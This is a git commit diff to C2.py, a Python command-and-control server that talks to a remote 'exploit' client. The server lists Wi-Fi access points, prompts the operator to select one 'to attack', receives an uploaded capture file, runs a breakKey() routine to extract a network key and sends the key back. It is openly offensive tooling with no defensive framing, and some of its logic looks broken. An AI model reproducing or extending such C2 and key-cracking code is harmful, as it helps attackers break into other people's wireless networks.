2a80ee6af5ec690bcee04a994acf1a7dfa841b75
connor <ConnorKirkpatrick3@gmail.com>
2022-03-07 22:01:54 +0000

    updated communication protocols between c2 and exploit

--- C2.py
+++ C2.py
@@ -36,31 +36,41 @@ print(f"[*] Listening as {HOST}:{PORT}")
 
 client_socket, client_address = s.accept()
 print(f"[+] {client_address} is connected.")
-received = client_socket.recv(BUFFER_SIZE).decode()
-filename, filesize = received.split(SEPARATOR)
-filename = os.path.basename(filename)
-filesize = int(filesize)
-progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
-with open(filename, "wb") as f:
-    while True:
-        # read 1024 bytes from the socket (receive)
-        bytes_read = client_socket.recv(BUFFER_SIZE)
-        if not bytes_read:
-            # nothing is received
-            # file transmitting is done
-            break
-        # write to the file the bytes we just received
-        f.write(bytes_read)
-        progress.update(len(bytes_read))
-    print("File received")
-    pass
 
-key = breakKey()
-if key is None:
-    print("No key extracted")
-else:
-    client_socket.sendall(bytes(key, 'utf-8'))
-    client_socket.close()
+receivedHeader = client_socket.recv(BUFFER_SIZE).decode()
+headerCode, headerMessage = receivedHeader.split(SEPARATOR)
+if headerCode == 1:
+    for i in range (0,len(headerMessage)):
+        print("["+i+"] :: "+headerMessage[i])
+    index = input("select the numeric value for the AP you wish to attack: ")
+    client_socket.sendall(bytes(index, 'utf-8'))
+
+elif headerCode == 2:
+    received = client_socket.recv(BUFFER_SIZE).decode()
+    filename, filesize = received.split(SEPARATOR)
+    filename = os.path.basename(filename)
+    filesize = int(filesize)
+    progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
+    with open(filename, "wb") as f:
+        while True:
+            # read 1024 bytes from the socket (receive)
+            bytes_read = client_socket.recv(BUFFER_SIZE)
+            if not bytes_read:
+                # nothing is received
+                # file transmitting is done
+                break
+            # write to the file the bytes we just received
+            f.write(bytes_read)
+            progress.update(len(bytes_read))
+        print("File received")
+        pass
+
+    key = breakKey()
+    if key is None:
+        print("No key extracted")
+    else:
+        client_socket.sendall(bytes(key, 'utf-8'))
+        client_socket.close()
 
 # close the server socket
 s.close()
